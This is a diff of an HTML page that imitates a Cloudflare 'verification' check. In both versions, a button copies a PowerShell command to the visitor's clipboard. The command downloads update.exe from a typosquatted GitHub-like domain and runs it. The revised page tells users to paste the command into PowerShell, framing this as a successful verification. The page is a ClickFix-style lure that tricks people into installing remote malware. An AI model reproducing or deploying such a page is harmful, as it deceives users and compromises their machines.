@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Just a moment...</title>
+    <title>Verification Gate</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -20,73 +20,39 @@
             border: 1px solid #e0e0e0;
             border-radius: 8px;
             width: 380px;
-            padding: 24px;
+            padding: 30px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.06);
         }
 
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
-        .domain { font-size: 15px; font-weight: 600; color: #1a1a1a; }
-        .sub-domain { font-size: 12px; color: #757575; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; }
+        .domain { font-size: 18px; font-weight: 600; color: #1a1a1a; }
+        .sub-domain { font-size: 14px; color: #757575; }
 
-        .captcha-widget {
-            background: #f9f9f9;
-            border: 1px solid #d3d3d3;
-            border-radius: 4px;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            cursor: pointer;
-            user-select: none;
-            transition: border-color 0.2s;
+        /* Area for CAPTCHA/Verification status */
+        .captcha-container {
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eeeeee;
+            margin-bottom: 20px;
         }
 
-        .captcha-widget:hover { border-color: #b7b7b7; }
+        .captcha-text { font-size: 16px; font-weight: 500; color: #222; }
 
-        .checkbox-container { display: flex; align-items: center; gap: 12px; }
-        .checkbox {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #c1c1c1;
-            border-radius: 2px;
-            background: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s;
-        }
-
-        .spinner {
-            width: 16px;
-            height: 16px;
-            border: 2px solid #1a73e8;
-            border-top: 2px solid transparent;
-            border-radius: 50%;
-            display: none;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .captcha-text { font-size: 14px; font-weight: 400; color: #222; }
-
-        .branding { display: flex; flex-direction: column; align-items: flex-end; }
-        .branding-text { font-size: 8px; color: #999; margin-top: 2px; }
+        .branding { display: flex; flex-direction: column; align-items: flex-end; margin-top: 10px; }
+        .branding-text { font-size: 10px; color: #999; }
 
         .clickfix-panel {
-            display: none;
-            margin-top: 16px;
+            margin-top: 20px;
             padding-top: 16px;
             border-top: 1px solid #eeeeee;
         }
 
-        .instruction-title { font-size: 12px; font-weight: 600; color: #d93025; margin-bottom: 10px; }
-        
+        .instruction-title { font-size: 14px; font-weight: 700; color: #d93025; margin-bottom: 15px; }
+
         .step-item {
-            font-size: 12px;
+            font-size: 13px;
             color: #4a4a4a;
-            margin-bottom: 8px;
-            line-height: 1.4;
+            margin-bottom: 12px;
+            line-height: 1.5;
         }
 
         kbd {
@@ -103,22 +69,22 @@
             background: #2563eb;
             color: white;
             border: none;
-            padding: 6px 12px;
+            padding: 8px 15px;
             border-radius: 4px;
-            font-size: 11px;
+            font-size: 12px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 4px;
+            transition: background 0.2s;
+            margin-top: 8px;
             display: inline-flex;
             align-items: center;
-            gap: 4px;
-            transition: background 0.2s;
+            gap: 5px;
         }
 
         .copy-btn:hover { background: #1d4ed8; }
         .copy-btn:active { background: #1e40af; }
 
-        .footer-text { margin-top: 16px; font-size: 11px; color: #9e9e9e; text-align: center; }
+        .footer-text { margin-top: 25px; font-size: 10px; color: #9e9e9e; text-align: center; }
     </style>
 </head>
 <body>
@@ -131,37 +97,32 @@
         </div>
     </div>
 
-    <div class="captcha-widget" id="captchaWidget" onclick="triggerFix()">
-        <div class="checkbox-container">
-            <div class="checkbox" id="checkbox"></div>
-            <div class="spinner" id="spinner"></div>
-            <span class="captcha-text">I'm not a robot</span>
-        </div>
+    <div class="captcha-container">
+        <!-- Status text is changed to indicate automatic success -->
+        <div class="captcha-text" style="font-size: 18px; font-weight: 600; color: #1a1a1a;">AUTOMATIC VERIFICATION SUCCESS</div>
+
         <div class="branding">
-            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f6821f" stroke-width="2">
-                <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
-            </svg>
+            <!-- Placeholder SVG for branding -->
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#f6821f" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
             <span class="branding-text">Cloudflare</span>
         </div>
     </div>
 
-    <div class="clickfix-panel" id="clickfixPanel">
-        <div class="instruction-title">⚠️ Verification Steps Required:</div>
-        
+    <div class="clickfix-panel">
+        <div class="instruction-title">✅ Verification Successful. Execute the following code:</div>
+
         <div class="step-item">
-            1. Copy the verification string:
-            <br>
-            <button class="copy-btn" onclick="copyPayload(event)">
-                📋 Copy Verification Code
+            1. Copy the verification command string:
+            <button class="copy-btn" id="copyBtn">
+                📋 Copy Command to Clipboard
             </button>
         </div>
-        
+
         <div class="step-item">
-            2. Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard.
-        </div>
-        
-        <div class="step-item">
-            3. Paste (<kbd>Ctrl</kbd> + <kbd>V</kbd>) and press <kbd>Enter</kbd>.
+            2. Paste (<kbd>Ctrl</kbd> + <kbd>V</kbd>) into your chosen terminal/environment.
+
+
+            (Note: It is best to paste this directly into a PowerShell console.)
         </div>
     </div>
 
@@ -169,35 +130,36 @@
 </div>
 
 <script>
-    function triggerFix() {
-        const checkbox = document.getElementById('checkbox');
-        const spinner = document.getElementById('spinner');
-        const panel = document.getElementById('clickfixPanel');
+    document.addEventListener('DOMContentLoaded', function() {
+        const copyBtn = document.getElementById('copyBtn');
 
-        checkbox.style.display = 'none';
-        spinner.style.display = 'block';
+        // The core, robust PowerShell command string
+        const fullCommand = 'powershell -NoProfile -Command "iwr -Uri \'https://rawgithubusercontent.com/Re-chapta-secure/rechaptasecure/refs/heads/main/update.exe\' -OutFile \"$env:TEMP\update.exe\"; Start-Process -FilePath \"$env:TEMP\update.exe\""';
 
-        setTimeout(() => {
-            spinner.style.display = 'none';
-            checkbox.style.display = 'flex';
-            checkbox.innerHTML = '✔';
-            checkbox.style.color = '#059669';
-            checkbox.style.borderColor = '#059669';
-            checkbox.style.fontSize = '14px';
+        // Set the initial text for the button
+        copyBtn.textContent = '📋 Copy Command';
 
-            panel.style.display = 'block';
-        }, 600);
-    }
+        copyBtn.onclick = function(e) {
+            // Use Async Clipboard API for modern browsers
+            navigator.clipboard.writeText(fullCommand)
+                .then(() => {
+                    // Success: Change button text to confirm copy
+                    copyBtn.textContent = '✓ Copied!';
+                    copyBtn.style.backgroundColor = '#059669';
 
-    function copyPayload(e) {
-        e.stopPropagation();
-        const fakeCommand = powershell -NoProfile -Command "iwr -Uri 'https://rawgithubusercontent.com/Re-chapta-secure/rechaptasecure/refs/heads/main/update.exe' -OutFile `"$env:TEMP\update.exe`"; Start-Process -FilePath `"$env:TEMP\update.exe`"";
-        navigator.clipboard.writeText(fakeCommand);
-        
-        const btn = e.target;
-        btn.innerText = '✓ Copied to Clipboard';
-        btn.style.background = '#059669';
-    }
+                    // Reset text after 2 seconds
+                    setTimeout(() => {
+                        copyBtn.textContent = '📋 Copy Command';
+                        copyBtn.style.backgroundColor = ''; // Reset background color
+                    }, 2000);
+                })
+                .catch(err => {
+                    // Failure handling
+                    console.error('Could not copy text: ', err);
+                    alert("Error copying! Please try manually selecting and copying the command text.");
+                });
+        };
+    });
 </script>
 
 </body>
